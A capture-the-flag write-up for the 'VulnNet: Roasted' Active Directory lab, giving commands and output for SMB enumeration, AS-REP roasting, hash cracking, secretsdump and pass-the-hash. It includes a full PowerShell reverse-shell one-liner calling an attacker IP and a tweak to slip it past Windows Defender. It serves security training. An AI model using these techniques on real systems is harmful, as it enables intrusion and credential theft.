# VulnNet: Roasted
### Enumeration
```
# Nmap 7.92 scan initiated Sun May  1 23:16:27 2022 as: nmap -sCV -v -oN tcp_1000.out 10.10.143.158
Nmap scan report for ip-10-10-143-158.eu-west-1.compute.internal (10.10.143.158)
Host is up (0.0020s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain?
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-01 23:16:38Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-05-01T23:18:55
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  1 23:19:34 2022 -- 1 IP address (1 host up) scanned in 187.23 seconds
```

We see that the hostname is `vulnnet-rst.local`.

##### LDAP
```
ldapsearch -x -H ldap://10.10.188.15 -b "dc=vulnnet-rst,dc=local"
```

Anonymous access not allowed.

##### SMB
Anonymous access allowed.
```
$ crackmapexec smb 10.10.188.15 --shares -u anonymous -p ''
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\anonymous:
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.188.15    445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

There were some text files in both of the readable share volumes. They contained some potential usernames, but before we try to make our own userlist, we can try to brute force SIDs to get usernames (hit enter when prompted for a password):

```
$ impacket-lookupsid anonymous@10.10.188.15
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.188.15
[*] StringBinding ncacn_np:10.10.188.15[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

With usernames, we can tryo to AS-REP roast. I created the userlist using the command below:

```
cat sid_lookup | grep -v Alias | grep -v Group | grep -Po '(?<=: VULNNET-RST\\)(.*)(?= \()'  > users.txt
```

Running `impacket-GetNPUsers`, we get:

```
$ impacket-GetNPUsers -request -format hashcat -dc-ip 10.10.188.15 vulnnet-rst.local/ -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:220b4807e7f793d73ad19df597363144$bb0aff6c6a2124e7376eed8c4cff69fbb15ece7b61726342be86de910964fa90dc02ecc596aeba32847b749ac9a04ac4610977575994b745ccd811bfd544f3b849ff79d8b9f12b78fdd098d881fbee8aa7eccd7cabd02c0ddba4ddc2ac75c9663f20a68a9448b674c8201dd9ed08839b81e50d3252e684e5f4920b1fba16d7a1697c0beefa5abbf569f6c1226d48e3859589836cd7739d119ecee8e2748a13959d24663ab212dcaeefd7357ca1a137f4bcac0407157b096cea0d065746d4e7717bf73c3d92935c145ac4339ab9bd2195da1d9e37c27d7d9e1eb24600f2fb56c72a5027517a143e4d995c8ab54930ffbe865c77f76b22
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We can try to crack this hash with hashcat:

```
hashcat -O -a 0 -m 18200 asrep-hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

We get the password `tj072889*`, so the credentials are `t-skid:tj072889*`.

With credentials, we can see if we have further access to shares, which we do! We're now able to read `NETLOGON`, `SYSVOL` and `IPC$`.

We're now also able to query LDAP:

```
ldapsearch -x -b 'dc=vulnnet-rst,dc=local' -H ldap://10.10.176.107 -D 'vulnnet-rst\t-skid' -W
```

Returning to SMB, we spider using `crackmapexec`:

```
crackmapexec smb 10.10.176.107 -u t-skid -p 'tj072889*' -M spider_plus
```

We notice that there's a file `ResetPassword.vbs` in both `NETLOGON` and `SYSVOL` - let's grab it:

```
$ smbclient //10.10.176.107/NETLOGON -U t-skid
Enter WORKGROUP\t-skid's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 23:15:49 2021
  ..                                  D        0  Tue Mar 16 23:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 23:18:14 2021

                8771839 blocks of size 4096. 4524451 blocks available
smb: \> get ResetPassword.vbs
```

In this file we see the following:

```vb
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

Let's see if we have further permission to perhaps write to SMB, which would allow use to use `psexec` or `wmiexec`.

```
$ crackmapexec smb 10.10.176.107 -u a-whitehat -p 'bNdKVkjv3RR9ht' --shares
SMB         10.10.176.107   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.176.107   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```

```
$ impacket-wmiexec a-whitehat@10.10.176.107 -shell-type powershell
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\>
```

This shell is quite slow, so I'm going to get a reverse shell instead using the one-liner below. Note, this comes from [this gist](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1), but I had to remove the prompt (`+ "PS " + (pwd).Path + "> "`), as Windows Defender was flagging this as malicious.

```
$client = New-Object System.Net.Sockets.TCPClient("10.11.72.110",445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Now we can grab the user flag from `C:\Users\enterprise-core-vn\Desktop\user.txt`.

We can also try to run `secretsdump`:

```
$ impacket-secretsdump a-whitehat@10.10.127.71

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
```

I've omitted a lot of output here, because all we care about is getting the administrator's hash. We can execute `wmiexec` with the hash to get an administrator shell:

```
$ impacket-wmiexec administrator@10.10.127.71 -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vulnnet-rst\administrator
```

Now we can grab the system flag.